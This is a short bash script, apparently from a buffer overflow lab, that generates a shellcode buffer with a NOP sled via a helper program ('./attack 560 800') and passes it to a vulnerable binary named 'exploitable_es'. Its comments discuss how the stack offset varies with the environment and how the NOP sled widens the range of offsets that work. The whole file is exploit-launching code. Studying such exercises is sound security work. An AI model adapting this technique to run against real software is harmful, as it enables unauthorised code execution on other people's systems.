#!/bin/bash

# generate shell code
# NOTE: The offset HEAVILY depends on the current environment.
# Especially, it seems that the base stack pointer for an
# executable depends on the process hierarchy - when launched
# from a shell, the stack pointer had a different value than
# when launched from a script

# With the NOP approach, there is now at least a RANGE of offsets which work:
# BUF=`./attack 560 1004`
BUF=`./attack 560 800`

# exploit ...
../exploitable_es $BUF
